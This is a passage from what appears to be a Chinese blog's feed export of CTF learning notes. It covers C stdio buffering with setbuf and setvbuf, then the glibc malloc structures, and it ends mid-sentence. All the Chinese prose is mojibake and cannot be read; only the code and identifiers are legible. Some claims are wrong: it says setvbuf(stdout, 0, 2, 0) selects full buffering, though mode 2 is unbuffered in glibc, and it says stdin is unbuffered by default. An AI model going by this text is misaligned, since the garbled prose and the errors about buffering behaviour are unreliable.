å‡½æ•°å¯ä»¥åœ¨æ‰“å¼€æ–‡ä»¶ä¹‹åç«‹å³è®¾ç½®æµçš„ç¼“å†²åŒºï¼Œè¿™æ¯”ä½¿ç”¨ setvbuf å‡½æ•°è¦ç®€å•ï¼Œä½†æ˜¯ setbuf å‡½æ•°ä¸æ”¯æŒè‡ªå®šä¹‰ç¼“å†²åŒºå¤§å°å’Œç¼“å†²æ¨¡å¼çš„è®¾ç½®ã€‚</p><h3 id="setvbuf"><a href="#setvbuf" class="headerlink" title="setvbuf"></a>setvbuf</h3><p>setvbufå’Œsetbufç±»ä¼¼</p><p>setvbuf å‡½æ•°åŸå‹ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cCopy code</span><br><span class="line">int setvbuf(FILE *restrict stream, char *restrict buf, int mode, size_t size);</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œstream æ˜¯ä¸€ä¸ªæŒ‡å‘ FILE ç»“æ„ä½“çš„æŒ‡é’ˆï¼Œç”¨äºæ ‡è¯†è¦è®¾ç½®ç¼“å†²åŒºçš„æµï¼›buf æ˜¯ä¸€ä¸ªæŒ‡å‘ char ç±»å‹çš„æ•°ç»„ï¼Œç”¨äºæŒ‡å®šç¼“å†²åŒºçš„åœ°å€ï¼›mode æ˜¯ä¸€ä¸ªæ•´æ•°å€¼ï¼Œç”¨äºæŒ‡å®šç¼“å†²åŒºçš„ç±»å‹ï¼Œå¯ä»¥ä¸ºä»¥ä¸‹ä¸‰ç§ç±»å‹ä¹‹ä¸€ï¼š</p><ul><li>_IONBFï¼šæ— ç¼“å†²åŒºç±»å‹ã€‚</li><li>_IOLBFï¼šè¡Œç¼“å†²åŒºç±»å‹ï¼Œé‡åˆ°æ¢è¡Œç¬¦æ—¶è‡ªåŠ¨åˆ·æ–°ç¼“å†²åŒºã€‚</li><li>_IOFBFï¼šå…¨ç¼“å†²åŒºç±»å‹ï¼Œç¼“å†²åŒºæ»¡æ—¶è‡ªåŠ¨åˆ·æ–°ç¼“å†²åŒºã€‚</li></ul><p>size å‚æ•°ç”¨äºæŒ‡å®šç¼“å†²åŒºçš„å¤§å°ï¼Œå¦‚æœç¼“å†²åŒºä¸ºå…¨ç¼“å†²ç±»å‹ï¼Œåˆ™ size è¡¨ç¤ºç¼“å†²åŒºçš„å¤§å°ï¼Œå¦‚æœä¸ºè¡Œç¼“å†²ç±»å‹ï¼Œåˆ™ size åº”è¯¥ä¸º 0ã€‚0ä¸æ˜¯ç©º,è€Œæ˜¯åˆé€‚å¤§å°.</p><h3 id="ç¼“å†²åŒºåˆ·æ–°"><a href="#ç¼“å†²åŒºåˆ·æ–°" class="headerlink" title="ç¼“å†²åŒºåˆ·æ–°"></a>ç¼“å†²åŒºåˆ·æ–°</h3><p>å½“ç¼“å†²åŒºæ»¡æ—¶(æˆ–è¡Œç¼“å†²é‡åˆ°\n)ï¼Œä¼šè§¦å‘ç¼“å†²åŒºåˆ·æ–°æ“ä½œï¼Œå³å°†ç¼“å†²åŒºå†…çš„æ•°æ®å‘é€åˆ°ç›¸åº”çš„æ–‡ä»¶æˆ–è®¾å¤‡ä¸­ã€‚å…·ä½“æ¥è¯´ï¼Œç¼“å†²åŒºæ»¡çš„æƒ…å†µä¸‹æœ‰ä¸¤ç§è§¦å‘ç¼“å†²åŒºåˆ·æ–°çš„æ–¹å¼ï¼š</p><ol><li>ç¼“å†²åŒºå¡«æ»¡(æˆ–è¡Œç¼“å†²é‡åˆ°\n)ï¼šå½“ç¼“å†²åŒºå·²æ»¡å¹¶ä¸”ç¨‹åºè¯•å›¾å‘å…¶å†™å…¥æ›´å¤šæ•°æ®æ—¶ï¼Œä¼šè‡ªåŠ¨è§¦å‘ç¼“å†²åŒºåˆ·æ–°æ“ä½œï¼Œå°†ç¼“å†²åŒºå†…çš„æ•°æ®å‘é€åˆ°ç›¸åº”çš„æ–‡ä»¶æˆ–è®¾å¤‡ä¸­ï¼Œä»¥ä¾¿ä¸ºæ–°çš„æ•°æ®è…¾å‡ºç©ºé—´ã€‚</li><li>å¼ºåˆ¶åˆ·æ–°ï¼šç¨‹åºå¯ä»¥é€šè¿‡è°ƒç”¨ fflush å‡½æ•°å¼ºåˆ¶åˆ·æ–°ç¼“å†²åŒºï¼Œå³å°†ç¼“å†²åŒºå†…çš„æ•°æ®ç«‹å³å‘é€åˆ°ç›¸åº”çš„æ–‡ä»¶æˆ–è®¾å¤‡ä¸­ï¼Œè€Œä¸å¿…ç­‰å¾…ç¼“å†²åŒºå¡«æ»¡ã€‚</li></ol><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<strong><u>åœ¨é»˜è®¤æƒ…å†µä¸‹</u></strong>ï¼Œç¼“å†²åŒºåœ¨ä»¥ä¸‹æƒ…å†µä¸‹ä¼šè‡ªåŠ¨åˆ·æ–°ï¼š</p><ol><li><strong>å½“ç¨‹åºæ­£å¸¸é€€å‡ºæ—¶ã€‚</strong></li><li><u><strong>å½“ç¨‹åºè°ƒç”¨ exit å‡½æ•°æ—¶ã€‚</strong></u></li><li><strong>å½“ç¨‹åºå‘æ ‡å‡†é”™è¯¯æµï¼ˆstderrï¼‰è¾“å‡ºæ•°æ®æ—¶ã€‚</strong></li></ol><h3 id="å¸¸è§å½¢å¼ä¸åŠŸèƒ½"><a href="#å¸¸è§å½¢å¼ä¸åŠŸèƒ½" class="headerlink" title="å¸¸è§å½¢å¼ä¸åŠŸèƒ½"></a>å¸¸è§å½¢å¼ä¸åŠŸèƒ½</h3><p>ç»å¸¸èƒ½åœ¨åšé¢˜æ—¶çœ‹è§</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><ul><li><code>setvbuf(stdout, 0, 2, 0);</code> è¡¨ç¤ºå°†æ ‡å‡†è¾“å‡ºæµ stdout è®¾ç½®ä¸ºå…¨ç¼“å†²æ¨¡å¼ï¼Œå¹¶ä¸”ç¼“å†²åŒºå¤§å°ä¸ºé»˜è®¤å¤§å°ã€‚</li><li><code>setvbuf(stdin, 0, 1, 0);</code> è¡¨ç¤ºå°†æ ‡å‡†è¾“å…¥æµ stdin è®¾ç½®ä¸ºè¡Œç¼“å†²æ¨¡å¼ï¼Œå¹¶ä¸”ç¼“å†²åŒºå¤§å°ä¸ºé»˜è®¤å¤§å°ã€‚</li><li><code>setvbuf(stderr, 0, 1, 0);</code> è¡¨ç¤ºå°†æ ‡å‡†é”™è¯¯æµ stderr è®¾ç½®ä¸ºè¡Œç¼“å†²æ¨¡å¼ï¼Œå¹¶ä¸”ç¼“å†²åŒºå¤§å°ä¸ºé»˜è®¤å¤§å°ã€‚</li></ul><p>æˆ–è€…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>)</span><br><span class="line">setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>)</span><br><span class="line">setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>setbufå‡½æ•°è¢«ç”¨æ¥ç¦ç”¨äº†æ ‡å‡†è¾“å…¥ã€æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯æµçš„ç¼“å†²åŒºï¼Œå°†å…¶è®¾ç½®ä¸ºæ— ç¼“å†²æ¨¡å¼ã€‚</p><p>åœ¨æ— ç¼“å†²æ¨¡å¼ä¸‹ï¼Œæ¯æ¬¡ä»æµä¸­è¯»å–æˆ–å†™å…¥çš„æ•°æ®éƒ½ä¼šç›´æ¥ä¼ è¾“åˆ°åº•å±‚è®¾å¤‡ï¼Œè€Œä¸ä¼šå…ˆç¼“å­˜åœ¨æµçš„ç¼“å†²åŒºä¸­ã€‚æ–‡ä»¶ä¸è®¾å¤‡æ˜¯ç›´æ¥äº¤äº’çš„ï¼Œä¸­é—´æ²¡æœ‰ç¼“å†²åŒºã€‚</p><h3 id="è‹¥æ— setbufä¸setvbuf"><a href="#è‹¥æ— setbufä¸setvbuf" class="headerlink" title="è‹¥æ— setbufä¸setvbuf"></a>è‹¥æ— setbufä¸setvbuf</h3><p>åœ¨æ ‡å‡†Cä¸­ï¼Œ<strong><u><em>é»˜è®¤æƒ…å†µä¸‹</em></u></strong>ï¼Œ<strong>æ ‡å‡†è¾“å…¥å’Œæ ‡å‡†é”™è¯¯æµæ˜¯ä¸ç¼“å†²çš„</strong>ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ¯æ¬¡è¯»å–æˆ–å†™å…¥<u>ä¸€ä¸ªå­—ç¬¦</u>æ—¶éƒ½ä¼šç«‹å³ä¸åº•å±‚è®¾å¤‡è¿›è¡Œäº¤äº’ã€‚è€Œ<strong>æ ‡å‡†è¾“å‡ºæµé»˜è®¤æ˜¯<u>è¡Œç¼“å†²</u>çš„</strong>ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ¯å½“è¾“å‡ºä¸€ä¸ª<u>æ¢è¡Œç¬¦</u>æˆ–è€…ç¼“å†²åŒºè¢«<u>å¡«æ»¡</u>æ—¶ï¼Œæ‰ä¼šå°†ç¼“å†²åŒºä¸­çš„æ•°æ®è¾“å‡ºåˆ°å±å¹•ä¸Šã€‚</p><p>è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆä¸€äº›é¢˜ç›®,æŒ‰ç…§æºç æ˜æ˜è¯¥æœ‰è¾“å‡º,ä½†ç®¡é“å´é˜»å¡æ— è¾“å‡ºçš„åŸå› </p><p><strong><u>æ­¤å¤–è‹¥ç¨‹åºåœ¨æ— setbufä¸setvbufçš„æƒ…å†µä¸‹,è¦æƒ³è·å¾—å…¶æœ€ç»ˆç»“æœè¾“å‡ºå°±éœ€è¦ä½¿å¾—ç¨‹åºæ­£å¸¸é€€å‡º(exit)</u></strong></p><p>å› ä¸ºæ­¤æ—¶è¾“å‡ºç»“æœæ˜¯å…ˆç¼“å­˜åœ¨æœåŠ¡å™¨æœ¬åœ°çš„ã€‚</p>]]></content>
    
    
    <summary type="html">ä¸€äº›ååˆ†åŸºç¡€çš„ä¸œè¥¿</summary>
    
    
    
    <category term="æ‚çƒ©" scheme="https://ixout.github.io/categories/%E6%9D%82%E7%83%A9/"/>
    
    
    <category term="å­¦ä¹ è®°å½•" scheme="https://ixout.github.io/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    <category term="åŸºç¡€" scheme="https://ixout.github.io/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>å †å­¦ä¹ ç¬”è®°</title>
    <link href="https://ixout.github.io/posts/8932/"/>
    <id>https://ixout.github.io/posts/8932/</id>
    <published>2023-03-02T14:31:03.000Z</published>
    <updated>2023-03-25T01:18:47.743Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å †çš„å­¦ä¹ å¯ä»¥è¯´æ˜¯ä¸€é“åäº†ï¼Œè¦æŒæ¡çš„è¯å¯¹æºç é˜…è¯»åŠç†è§£çš„èƒ½åŠ›è¦æ±‚æŒºé«˜ï¼Œåˆå­¦æ—¶å¾€å¾€è¢«æå¾—æ™•å¤´è½¬å‘ï¼Œè¿™é‡Œå°±è®°å½•ä¸€ä¸‹æˆ‘çš„å­¦ä¹ è®°å½•ï¼ŒåŸºç¡€çš„ä¸œè¥¿åˆ°å¤„éƒ½æœ‰å°±ä¸è®°äº†ï¼Œä¸»è¦è¿˜æ˜¯è®°ä¸€äº›æˆ‘è®¤ä¸ºæ¯”è¾ƒé‡è¦æˆ–è€…å®¹æ˜“è¢«å¿½ç•¥çš„ç»†èŠ‚ã€‚</p><hr><h1 id="å­¦ä¹ è®°å½•"><a href="#å­¦ä¹ è®°å½•" class="headerlink" title="å­¦ä¹ è®°å½•"></a>å­¦ä¹ è®°å½•</h1><h2 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h2><p>åŸºç¡€çš„ä¸œè¥¿ç½‘ä¸Šèƒ½æœåˆ°çš„æ•™ç¨‹(åƒctfwiki,ç‹¼ç»„å®‰å…¨,ctf-all-in-oneç­‰)è®²çš„å·²ç»å¾ˆç»†äº†ï¼Œè®¤çœŸçœ‹ä¸€å®šèƒ½æœ‰ä¸€ä¸ªåŸºç¡€çš„çŸ¥è¯†æ¡†æ¶.ä¸è¿‡è¿˜æ˜¯æ¨èçœ‹ä¸€çœ‹ååº­å¤§ä½¬çš„<a href="https://pan.baidu.com/s/167Z3CHDEeP1dl3c2Ii0lXg?pwd=1234">glibcå†…å­˜ç®¡ç†-ptmalloc2æºç åˆ†æ</a>(å¾ˆç»†å¾ˆå…¨å¾ˆç›´ç™½),çœ‹äº†ä¹‹åçœŸçš„èƒ½æœ‰å¾ˆå¤šæ”¶è·.</p><h2 id="ç†æ¸…ä»å±å…³ç³»"><a href="#ç†æ¸…ä»å±å…³ç³»" class="headerlink" title="ç†æ¸…ä»å±å…³ç³»"></a>ç†æ¸…ä»å±å…³ç³»</h2><p>åˆå­¦æ—¶,heap,arena,chunkè¿™äº›ä¸œè¥¿å¾ˆå®¹æ˜“æŠŠäººæç³Šæ¶‚,è¿™é‡Œç®€å•æ¢³ç†ä¸€ä¸‹</p><p>ç³»ç»Ÿä¸­æ•´ä¸ªå †åŠŸèƒ½çš„å®ç°åŒºåŸŸéƒ½å¯ä»¥è¢«å«åšå †(heap),ä½†å…¶å®ä½†heapè¿˜æœ‰ä¸€ä¸ªç›¸å¯¹è¿™ä¸ªæ•´ä¸ªå †åŒºåŸŸè¦æ›´å°çš„æ¦‚å¿µ,å¦‚ä¸‹:</p><p>glibcçš„mallocæºç ä¸­æ¶‰åŠä¸‰ç§æœ€é‡è¦æ•°æ®ç»“æ„ï¼š<strong>Arenaã€Heapã€Chunk</strong> ï¼Œåˆ†åˆ«å¯¹åº”ç»“æ„ä½“<strong>malloc_stateã€heap_infoã€malloc_chunk ã€‚</strong>æ¯ä¸ªæ•°æ®ç»“æ„éƒ½æœ‰å¯¹åº”çš„ç»“æ„ä½“å®ç°,å¦‚å›¾:</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-16_095156.png" alt=""></p><ul><li><strong>Thread - Arena</strong> ï¼š ä¸€ä¸ªArenaå¯¹åº”å¤šä¸ªçº¿ç¨‹Threadã€‚å³æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰ä¸€ä¸ªArenaï¼Œä½†æ˜¯æœ‰å¯èƒ½å¤šä¸ªçº¿ç¨‹å…±ç”¨ä¸€ä¸ªArena(åŒä¸€æ—¶é—´åªèƒ½ä¸€å¯¹ä¸€)ã€‚æ¯ä¸ªArenaéƒ½åŒ…å«ä¸€ä¸ªmalloc_stateç»“æ„ä½“ï¼Œä¿å­˜bins, top chunk, Last reminder chunkç­‰ä¿¡æ¯ã€‚</li><li><strong>Arena - Heap</strong>ï¼šä¸€ä¸ªArenaå¯èƒ½æ‹¥æœ‰å¤šä¸ªheapã€‚Arenaå¼€å§‹çš„æ—¶å€™åªæœ‰ä¸€ä¸ªheapï¼Œä½†æ˜¯å½“è¿™ä¸ªheapçš„ç©ºé—´ç”¨å°½æ—¶ï¼Œå°±éœ€è¦è·å–æ–°çš„heapã€‚(ä¹Ÿå¯ä»¥ç†è§£ä¸ºsubheapå­å †)</li><li><strong>Heap - Chunk</strong>ï¼šä¸€ä¸ªHeapæ ¹æ®ç”¨æˆ·çš„è¯·æ±‚ä¼šåˆ’åˆ†ä¸ºå¤šä¸ªchunkï¼Œæ¯ä¸ªchunkæ‹¥æœ‰è‡ªå·±çš„header - malloc_chunkã€‚</li></ul><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-18_161600.png" alt=""></p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<em>Main Arenaåªæœ‰ä¸€ä¸ªheapï¼Œå› æ­¤æ²¡æœ‰heap_infoç»“æ„</em>ã€‚å½“main arenaç”¨å°½ç©ºé—´åï¼Œä¼šæ‰©å±•å½“å‰çš„heapç©ºé—´ã€‚æ­¤å¤–ï¼ŒMain Areançš„Arena headerå¹¶ä¸æ˜¯heap segmentçš„ä¸€éƒ¨åˆ†ï¼Œè€Œä½œä¸ºå…¨å±€å˜é‡å‚¨å­˜åœ¨libc.soçš„æ•°æ®æ®µä¸­ã€‚</p><p>ä¸‹å›¾æ˜¯åªæœ‰ä¸€ä¸ªheapæ—¶ï¼Œä¸»çº¿ç¨‹å’Œçº¿ç¨‹çš„å †ç»“æ„ç¤ºæ„å›¾ï¼Œå·¦å›¾æ˜¯Main Arenaï¼Œå³å›¾æ˜¯Threa Arenaã€‚å †æ˜¯ä»ä½åœ°å€å‘é«˜åœ°å€å¢é•¿çš„ï¼Œå¯ä»¥çœ‹åˆ°æ¯ä¸€ä¸ªmalloc_chunkä¸Šé¢éƒ½è·Ÿç€ä¸€ä¸ªchunkã€‚åŒæ—¶Main Arenaæ²¡æœ‰heap_infoå’Œmalloc_stateçš„ç»“æ„ã€‚ </p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-16_095630.png" alt=""></p><p>ä¸‹å›¾æ˜¯å­˜åœ¨å¤šä¸ªheapçš„thread Arenaçš„æƒ…å†µã€‚å¯ä»¥çœ‹åˆ°æ¯ä¸€ä¸ªheapéƒ½ä¸€ä¸ªheap headerï¼ˆheap_infoï¼‰ï¼Œä½†æ˜¯åªæœ‰æœ€åˆçš„heapæ‹¥æœ‰arena header(malloc_state).</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-16_095644.png" alt="graph"></p><p>å½“çº¿ç¨‹ç”³è¯·å†…å­˜æ—¶ï¼Œå°±åˆ›å»ºä¸€ä¸ªArenaã€‚ä¸»çº¿ç¨‹æœ‰è‡ªå·±ç‹¬ç«‹çš„Arenaï¼Œå«åšmain arenaï¼Œä½†ä¸æ˜¯æ¯ä¸€ä¸ªçº¿ç¨‹éƒ½æœ‰ç‹¬ç«‹çš„Arenaã€‚</p><p>Arenaçš„ä¸ªæ•°å–å†³äºcpuæ ¸çš„ä¸ªæ•°</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-17_204838.png" alt=""></p><h2 id="ä¸‰ä¸ªé‡è¦ç»“æ„ä½“çš„å®šä¹‰"><a href="#ä¸‰ä¸ªé‡è¦ç»“æ„ä½“çš„å®šä¹‰" class="headerlink" title="ä¸‰ä¸ªé‡è¦ç»“æ„ä½“çš„å®šä¹‰"></a>ä¸‰ä¸ªé‡è¦ç»“æ„ä½“çš„å®šä¹‰</h2><h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class="line">  <span class="comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class="line">  <span class="type">int</span> have_fastchunks;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  mstate ar_ptr; <span class="comment">/* Arena for this heap. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span> <span class="comment">/* Previous heap. */</span></span><br><span class="line">  <span class="type">size_t</span> size;   <span class="comment">/* Current size in bytes. */</span></span><br><span class="line">  <span class="type">size_t</span> mprotect_size; <span class="comment">/* Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">                           PROT_READ|PROT_WRITE.  */</span></span><br><span class="line">  <span class="comment">/* Make sure the following data is properly aligned, particularly</span></span><br><span class="line"><span class="comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></span><br><span class="line"><span class="comment">     MALLOC_ALIGNMENT. */</span></span><br><span class="line">  <span class="type">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure><h2 id="mallocå’Œfreeçš„æµç¨‹"><a href="#mallocå’Œfreeçš„æµç¨‹" class="headerlink" title="mallocå’Œfreeçš„æµç¨‹"></a>mallocå’Œfreeçš„æµç¨‹</h2><h3 id="mallocæµç¨‹"><a href="#mallocæµç¨‹" class="headerlink" title="mallocæµç¨‹"></a>mallocæµç¨‹</h3><hr><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/1678786338164.png" alt="malloc"></p><h3 id="freeæµç¨‹"><a href="#freeæµç¨‹" class="headerlink" title="freeæµç¨‹"></a>freeæµç¨‹</h3><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/1678786338155.png" alt="free"></p><h2 id="ç»†èŠ‚"><a href="#ç»†èŠ‚" class="headerlink" title="ç»†èŠ‚"></a>ç»†èŠ‚</h2><h3 id="binsæ•°ç»„ç›¸å…³"><a href="#binsæ•°ç»„ç›¸å…³" class="headerlink" title="binsæ•°ç»„ç›¸å…³"></a>binsæ•°ç»„ç›¸å…³</h3><p>binsæ•°ç»„å­˜åœ¨äºmalloc_stateç»“æ„ä½“ä¸­,å®ƒè¢«å®šä¹‰ä¸ºä¸€ä¸ªé•¿åº¦ä¸º254çš„æ•°ç»„,ä½†æˆ‘ä»¬éƒ½çŸ¥é“çœŸæ­£åªæœ‰126ä¸ªbin,åŠæœ‰æ•ˆä¸‹æ ‡ä¸º[0,251] (å¤šçš„é‚£ä¸¤ä¸ªè¢«æµªè´¹äº†)ã€‚</p><p>æ¯ä¸ªbinséƒ½æ˜¯ä¸€ä¸ªæŒ‡é’ˆ,åœ¨ä¸²è”binä¸­èµ·åˆ°äº†é‡è¦ä½œç”¨,åŒä¸€ä¸ªbinçš„fdæŒ‡é’ˆå’ŒbkæŒ‡é’ˆè¢«å­˜å‚¨åœ¨ç›¸é‚»ä½ç½®(ä¾‹å¦‚bins[0]ä¸ºunsortedbinçš„fdæŒ‡é’ˆbins[1]ä¸ºunsortedbinçš„bkæŒ‡é’ˆ)ã€‚</p><p>ä½†å…¶å®åœ¨è®²è§£è¿‡ç¨‹ä¸­æˆ‘ä»¬æ›´å¤šæåŠçš„æ˜¯binçš„ä¸‹æ ‡,å®é™…ä¸Šbinæ•°ç»„æ˜¯ä¸€ä¸ªæ›´æŠ½è±¡çš„æ¦‚å¿µï¼Œå®ƒå®é™…<strong>å¹¶ä¸å­˜åœ¨</strong>,ä½†ä½¿ç”¨binæ•°ç»„ä¸‹æ ‡ä¸å¯¹åº”å„ä¸ªbinçš„å…³ç³»æ›´ä¸ºç›´æ¥ï¼Œå› æ­¤è¢«æ›´å¤šçš„ä½¿ç”¨ã€‚</p><p>binsä¸‹æ ‡[X]ä¸binä¸‹æ ‡[Y]çš„å…³ç³»ä¸º:</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-17_203928.png" alt=""></p><p>è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆè®¸å¤šæ•™ç¨‹ä¼šè¯´bin[0]å’Œbin[127]ä¸å­˜åœ¨äº†,å› ä¸ºå¦‚æœè¿™æ ·çš„è¯å¯¹åº”çš„binsä¸‹æ 